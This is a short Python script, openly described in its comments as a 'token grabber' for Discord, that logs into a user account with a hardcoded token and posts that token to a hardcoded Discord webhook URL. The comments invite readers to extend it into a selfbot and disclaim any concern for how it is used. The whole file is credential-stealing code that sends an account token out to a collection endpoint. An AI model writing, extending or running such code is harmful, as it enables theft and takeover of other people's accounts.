#Incredibly basic token grabber that the user must use, add shit to it and make it a selfbot.
#i dont care what you do with this 
import discord, aiohttp
from discord import Webhook, AsyncWebhookAdapter
t = "g3Pz3z5BSwWXuLSKG4K04i4Ikja25zDOq5vs9SL4cjCjwNzcH6UJkviL8OTNlF879qsR"  #token
class MyClient(discord.Client):
  async def on_connect(self):
      print(f"token grabbed")
      async with aiohttp.ClientSession() as session:
          webhook = Webhook.from_url("https://discord.com/api/webhooks/826771852411142144/g3Pz3z5BSwWXuLSKG4K04i4Ikja25zDOq5vs9SL4cjCjwNzcH6UJkviL8OTNlF879qsR", adapter=AsyncWebhookAdapter(session))
          await webhook.send(f"||{t}||")



client = MyClient()
try:
 client.run(t, bot=False)
except discord.LoginFailure:
 print(f"invalid")
